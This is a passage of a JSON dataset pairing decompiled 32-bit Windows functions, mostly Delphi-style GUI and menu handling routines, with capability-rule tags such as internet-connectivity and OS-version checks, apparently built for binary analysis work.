        "decompiled_code": "\nvoid __fastcall fcn.00450014(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_FS_OFFSET;\n    uchar uVar8;\n    uint uStack112;\n    uint uStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint uStack44;\n    int32_t *var_20h;\n    uchar var_1ah;\n    char var_19h;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    var_48h = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    var_2ch = 0;\n    var_30h = 0;\n    var_34h = 0;\n    var_4h = 0;\n    var_18h = 0;\n    uStack96 = 0x4504b3;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    var_1ah = 0;\n    puVar1 = &stack0xfffffffc;\n    var_19h = param_2;\n    if (param_2 != '\\0') {\ncode_r0x00450070:\n        puStack92 = puVar1;\n        puStack104 = 0x45007e;\n        fcn.00404660();\n        var_ch = NULL;\n        var_14h = NULL;\n        var_20h = NULL;\n        var_8h = NULL;\n        var_10h = 0;\n        uStack108 = 0x450474;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        puStack104 = &stack0xfffffffc;\n        var_ch = fcn.004037f0();\n        var_14h = fcn.004037f0();\n        var_20h = fcn.004037f0();\n        var_8h = fcn.004037f0();\n        iVar3 = fcn.0044f454();\n        if (-1 < iVar3 + -1) {\n            do {\n                var_38h = iVar3;\n                iVar3 = fcn.0044f464();\n                uVar8 = *(iVar3 + 0x3e) == '\\0';\n                if (!uVar8) {\n                    fcn.0044f464();\n                    fcn.004049d4();\n                    if ((!uVar8) && (iVar3 = fcn.0044f464(),  *(iVar3 + 0x30) != 0)) {\n                        fcn.0044f464();\n                        fcn.00451fe8();\n                        fcn.004088b0();\n                        if (var_2ch == 0) {\n                            uVar4 = fcn.0044f464();\n                            fcn.0044f464(uVar4);\n                            (**(*var_20h + 100))();\n                        }\n                        else {\n                            iVar3 = fcn.0040d5a0();\n                            if ((iVar3 != 0) && (cVar2 = fcn.0044fe00(&stack0xfffffffc),  cVar2 == '\\0')) {\n                                iVar3 = fcn.0044f464();\n                                fcn.0044f464(iVar3 + 0x30);\n                                fcn.00451f50();\n                                fcn.0040461c();\n                                uVar4 = fcn.0044f464();\n                                fcn.0044f464(uVar4);\n                                (**(*var_20h + 100))();\n                            }\n                        }\n                    }\n                }\n                var_38h = var_38h + -1;\n                iVar3 = var_38h;\n            } while (var_38h != 0);\n        }\n        fcn.00404660();\n        iVar3 = (**(*var_20h + 0x14))();\n        if (-1 < iVar3 + -1) {\n            do {\n                var_38h = iVar3;\n                fcn.00404660();\n                (**(*var_14h + 8))();\n                (**(*var_ch + 0x44))();\n                iVar3 = (**(*var_14h + 0x14))();\n                iVar3 = iVar3 + -1;\n                if (-1 < iVar3) {\n                    do {\n                        (**(*var_14h + 0xc))();\n                        for (iVar7 = 1; iVar6 = fcn.00404888(),  iVar7 <= iVar6; iVar7 = iVar7 + 1) {\n                            uVar5 = *(var_30h + -1 + iVar7);\n                            if ((*(*0x48483c + (uVar5 >> 3)) >> (uVar5 & 7) & 1) == 0) {\n                                fcn.00404ae8(&fcn.00450014::var_44h);\n                                fcn.004088b0();\n                                cVar2 = fcn.0044fe00(&stack0xfffffffc);\n                                if (cVar2 != '\\0') {\n                                    if (*(*0x484858 + 0xc) == '\\0') {\n                                        fcn.00404b70();\n                                    }\n                                    else {\n                                        fcn.0044feb4();\n                                    }\n                                    (**(*var_14h + 0x18))();\n                                    (**(*var_ch + 0x3c))();\n                                    (**(*var_14h + 0x48))();\n                                    break;\n                                }\n                            }\n                            else {\n                                iVar7 = iVar7 + 1;\n                            }\n                        }\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n                iVar3 = (**(*var_ch + 0x14))();\n                if (var_10h < iVar3) {\n                    fcn.0044fe30(&stack0xfffffffc);\n                }\n                iVar3 = (**(*var_14h + 0x14))();\n                if (iVar3 < 1) break;\n                iVar3 = (**(*var_14h + 0x14))();\n                if (-1 < iVar3 + -1) {\n                    do {\n                        (**(*var_14h + 0x18))();\n                        uStack44 = (**(*var_20h + 0x5c))();\n                        (**(*var_20h + 0x14))();\n                        (**(*var_20h + 0x70))();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                }\n                var_38h = var_38h + -1;\n                iVar3 = var_38h;\n            } while (var_38h != 0);\n        }\n        if (var_10h == 0) {\n            fcn.0044fe30(&stack0xfffffffc);\n        }\n        iVar3 = (**(*var_8h + 0x14))();\n        var_1ah = 0 < iVar3;\n        iVar3 = (**(*var_8h + 0x14))();\n        if (-1 < iVar3 + -1) {\n            do {\n                var_38h = iVar3;\n                (**(*var_8h + 0xc))();\n                if ((((*(*0x484858 + 0xc) != '\\0') && (iVar3 = fcn.0040d5a0(),  iVar3 == 0)) && (var_18h != 0)) &&\n                   (iVar3 = fcn.0040d5a0(),  iVar3 == 0)) {\n                    fcn.00404888(&fcn.00450014::var_48h);\n                    fcn.00404ae8();\n                    fcn.0044feb4();\n                    fcn.00404888();\n                    fcn.00404b28();\n                }\n                (**(*var_8h + 0x18))();\n                fcn.0040461c();\n                var_38h = var_38h + -1;\n                iVar3 = var_38h;\n            } while (var_38h != 0);\n        }\n        *in_FS_OFFSET = uStack112;\n        puStack104 = 0x45047b;\n        uStack108 = 0x45045b;\n        fcn.00403820();\n        uStack108 = 0x450463;\n        fcn.00403820();\n        uStack108 = 0x45046b;\n        fcn.00403820();\n        uStack108 = 0x450473;\n        fcn.00403820();\n        return;\n    }\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        puStack104 = 0x450068;\n        cVar2 = fcn.00450668();\n        puVar1 = puStack92;\n        if (cVar2 != '\\0') goto code_r0x00450070;\n    }\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x4504ba;\n    uStack96 = 0x450495;\n    fcn.004045ec();\n    uStack96 = 0x4504a2;\n    fcn.004045ec();\n    uStack96 = 0x4504aa;\n    fcn.004045c8();\n    uStack96 = 0x4504b2;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 2232
    },
    "0045025e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00450260) overlaps instruction at (ram,0x0045025f)\n// \n\nvoid __fastcall fcn.0045025e(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t iVar8;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    iVar8 = unaff_EBP + 1;\n    puVar2 = param_2 + -0x7400e7bc;\n    uVar3 = *puVar2;\n    *puVar2 = *puVar2 >> 1 | (uVar3 & 1) << 7;\n    uVar5 = in_EAX + 0x48483c + (uVar3 & 1);\n    do {\n        if ((*(param_2 + ((uVar5 & 0xff) >> 3)) >> (uVar5 & 7) & 1) == 0) {\n            fcn.00404ae8(unaff_EBP + -0x43);\n            fcn.004088b0();\n            cVar4 = fcn.0044fe00(iVar8);\n            if (cVar4 != '\\0') {\n                if (*(*0x484858 + 0xc) == '\\0') {\n                    fcn.00404b70();\n                }\n                else {\n                    fcn.0044feb4();\n                }\n                (**(**(unaff_EBP + -0x13) + 0x18))();\n                (**(**(unaff_EBP + -0xb) + 0x3c))();\n                (**(**(unaff_EBP + -0x13) + 0x48))();\n                goto code_r0x00450300;\n            }\n        }\n        else {\n            unaff_EBX = unaff_EBX + 1;\n        }\n        unaff_EBX = unaff_EBX + 1;\n        while (iVar6 = fcn.00404888(),  iVar6 < unaff_EBX) {\ncode_r0x00450300:\n            unaff_ESI = unaff_ESI + -1;\n            if (unaff_ESI == -1) {\n                do {\n                    iVar6 = (**(**(unaff_EBP + -0xb) + 0x14))();\n                    if (*(unaff_EBP + -0xf) < iVar6) {\n                        fcn.0044fe30(iVar8);\n                    }\n                    iVar6 = (**(**(unaff_EBP + -0x13) + 0x14))();\n                    if (iVar6 < 1) {\ncode_r0x00450376:\n                        if (*(unaff_EBP + -0xf) == 0) {\n                            fcn.0044fe30(iVar8);\n                        }\n                        iVar8 = (**(**(unaff_EBP + -7) + 0x14))();\n                        *(unaff_EBP + -0x19) = 0 < iVar8;\n                        iVar8 = (**(**(unaff_EBP + -7) + 0x14))();\n                        if (-1 < iVar8 + -1) {\n                            *(unaff_EBP + -0x37) = iVar8;\n                            do {\n                                (**(**(unaff_EBP + -7) + 0xc))();\n                                if ((((*(*0x484858 + 0xc) != '\\0') && (iVar8 = fcn.0040d5a0(),  iVar8 == 0)) &&\n                                    (*(unaff_EBP + -0x17) != 0)) && (iVar8 = fcn.0040d5a0(),  iVar8 == 0)) {\n                                    fcn.00404888(unaff_EBP + -0x47);\n                                    fcn.00404ae8();\n                                    fcn.0044feb4();\n                                    fcn.00404888();\n                                    fcn.00404b28();\n                                }\n                                (**(**(unaff_EBP + -7) + 0x18))();\n                                fcn.0040461c();\n                                piVar1 = unaff_EBP + -0x37;\n                                *piVar1 = *piVar1 + -1;\n                            } while (*piVar1 != 0);\n                        }\n                        *in_FS_OFFSET = unaff_retaddr;\n                        fcn.00403820();\n                        fcn.00403820();\n                        fcn.00403820();\n                        fcn.00403820();\n                        return;\n                    }\n                    iVar6 = (**(**(unaff_EBP + -0x13) + 0x14))();\n                    if (-1 < iVar6 + -1) {\n                        do {\n                            (**(**(unaff_EBP + -0x13) + 0x18))();\n                            uVar7 = (**(**(unaff_EBP + -0x1f) + 0x5c))();\n                            *(unaff_EBP + -0x27) = uVar7;\n                            (**(**(unaff_EBP + -0x1f) + 0x14))();\n                            (**(**(unaff_EBP + -0x1f) + 0x70))();\n                            iVar6 = iVar6 + -1;\n                        } while (iVar6 != 0);\n                    }\n                    piVar1 = unaff_EBP + -0x37;\n                    *piVar1 = *piVar1 + -1;\n                    if (*piVar1 == 0) goto code_r0x00450376;\n                    fcn.00404660();\n                    (**(**(unaff_EBP + -0x13) + 8))();\n                    (**(**(unaff_EBP + -0xb) + 0x44))();\n                    iVar6 = (**(**(unaff_EBP + -0x13) + 0x14))();\n                    unaff_ESI = iVar6 + -1;\n                } while (unaff_ESI < 0);\n            }\n            (**(**(unaff_EBP + -0x13) + 0xc))();\n            unaff_EBX = 1;\n        }\n        uVar5 = *(*(unaff_EBP + -0x2f) + -1 + unaff_EBX);\n        param_2 = *0x48483c;\n    } while( true );\n}\n",
        "token_count": 1445
    },
    "00450510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00450510(uint param_1, char param_2)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (in_EAX = fcn.00450694(),  in_EAX != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.0044f454();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.0044f464();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.0044f464();\n                    cVar1 = fcn.004504ec();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.0044f464();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.0044f454();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.0044f464();\n                cVar1 = fcn.004504ec();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.0044f464();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.0044f464();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        in_EAX = fcn.0044f454();\n        iVar4 = iStack20 - (in_EAX - 1);\n        if (iVar4 == 0 || iStack20 < in_EAX - 1) {\n            iVar4 = iVar4 + -1;\n            do {\n                in_EAX = fcn.0044f464();\n                if (*(in_EAX + 0x3e) != '\\0') {\n                    fcn.0044f464();\n                    in_EAX = fcn.004504ec();\n                    if (in_EAX == '\\0') break;\n                    in_EAX = fcn.0044f464();\n                    *(in_EAX + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 != 0);\n        }\n    }\n    return CONCAT44(iStack20, in_EAX & 0xffffff00 | uStack24);\n}\n",
        "token_count": 852
    },
    "00450668": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00450668(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.00450668();\n        uVar1 = *((uVar1 & 0x7f) + 0x483d28);\n    }\n    return *((uVar1 & 0x7f) + 0x483d2c);\n}\n",
        "token_count": 137
    },
    "00450694": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00450694(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.00450694();\n        uVar1 = *((uVar1 & 0x7f) + 0x483d28);\n    }\n    return *((uVar1 & 0x7f) + 0x483d2c);\n}\n",
        "token_count": 137
    },
    "004506c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.004506c0(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.0044d368();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.004037f0();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x451008;\n    *(in_EAX + 0x41) = 1;\n    fcn.0042273c();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.0045141c();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 361
    },
    "00450810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00450810(uint32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0;\n    if ((((*(arg_8h - 1) == '\\0') && (*(arg_8h - 8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h - 1) == '\\x01' && (*(arg_8h - 8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h - 1) == '\\x02' && (*(arg_8h - 8) == *(in_EAX + 0x60))))) {\n        *(arg_8h - 0xc) = in_EAX;\n        _auStack8 = 0x1000000;\n        uVar1 = arg_8h;\n    }\n    else {\n        uVar1 = fcn.0044f454();\n        uVar2 = uVar1;\n        if (-1 < uVar1 - 1) {\n            do {\n                uVar1 = arg_8h;\n                fcn.0044f464();\n                uVar1 = fcn.00450810(uVar1);\n                if (uVar1 != '\\0') {\n                    _auStack8 = 0x1000000;\n                    break;\n                }\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n    }\n    return uVar1 & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 396
    },
    "004508d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004508d8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004039b8(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.00451cd4();\n    }\n    else {\n        for (iVar2 = fcn.004508a8(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 241
    },
    "00450a2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450a2c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 68
    },
    "00450a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00450a50(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    piVar1 = (*in_EAX)[0x19];\n    piVar2 = piVar1;\n    if (piVar1 != NULL) {\n        uStackY32 = 0x450a7e;\n        piVar2 = fcn.00450a50(arg_8h);\n        var_1h._0_1_ = piVar2;\n    }\n    piVar4 = piVar2 & 0xffffff00;\n    if ((var_1h != 0) && (var_1h != 3)) {\n        if (var_1h == 2) {\n            if ((arg_8h[-1] == 0) || (*(arg_8h[-1] + 0x60) != *(arg_8h + -6))) {\n                iVar3 = fcn.004508a8();\n                arg_8h[-1] = iVar3;\n                if (arg_8h[-1] == 0) {\n                    var_1h._0_1_ = 3;\n                    piVar4 = arg_8h;\n                    goto code_r0x00450b97;\n                }\n            }\n            piVar4 = fcn.00450a40();\n            *in_EAX = piVar4;\n            if ((*in_EAX == NULL) || (piVar4 = (*in_EAX)[0x19],  piVar4 != piVar1)) goto code_r0x00450b97;\n            if (in_EDX == 0) {\n                var_1h._0_1_ = 1;\n            }\n        }\n        piVar4 = *in_EAX;\n        if (*(piVar4 + 0x39) == '\\0') {\n            var_1h._0_1_ = 0;\n        }\n        else {\n            uStackY32 = 0x450b75;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(arg_8h[-3] + 0x1c) & 0x10) == 0) {\n                fcn.0044f97c();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((arg_8h[-1] == 0) || ((*in_EAX != arg_8h[-1] && (*(arg_8h[-1] + 0x60) != *(arg_8h + -6))))) {\n                var_1h._0_1_ = 2;\n            }\n            piVar4 = NULL;\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\ncode_r0x00450b97:\n    return piVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 746
    },
    "00450ba4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450ba4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    if (*(param_2 + 4) == '\\0') {\n        return 0;\n    }\n    uStack32 = 0x10;\n    uStack36 = 0x450bcd;\n    sub.user32.dll_GetKeyState();\n    uStack36 = 0x11;\n    puStack40 = 0x450bdf;\n    sub.user32.dll_GetKeyState();\n    puStack40 = 0x450c0c;\n    fcn.0042d914();\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack44 = 0x450ca2;\n    puStack52 = 0x450c2c;\n    puStack40 = &stack0xfffffffc;\n    iVar1 = fcn.004508a8();\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = uStack48;\n        puStack40 = 0x450ca9;\n        uStack44 = 0x450ca1;\n        uVar2 = fcn.0042d900();\n        return uVar2;\n    }\n    puStack52 = 0x450c42;\n    fcn.0042d914();\n    uStack56 = 0x450c77;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00450a50(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x450c7e;\n    uStack56 = 0x450c76;\n    uVar2 = fcn.0042d900();\n    return uVar2;\n}\n",
        "token_count": 491
    },
    "00450cc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450cc8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x450cef;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.0045107c();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.0045107c();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 433
    },
    "00450e54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450e54(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.00450d84(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.00404a88();\n        iVar1 = fcn.00409378();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.00404838();\n    return 1;\n}\n",
        "token_count": 174
    },
    "00450ee8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450ee8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x484858 + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x450f58;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.004513f8();\n        }\n        else {\n            fcn.004513f8();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x450f5f;\n        uStack20 = 0x450f4e;\n        fcn.004513f8();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 296
    },
    "00450f64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450f64(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.00450e54();\n    if ((*(*0x484858 + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.00450ee8();\n        }\n        else {\n            fcn.0045141c();\n        }\n    }\n    return;\n}\n",
        "token_count": 133
    },
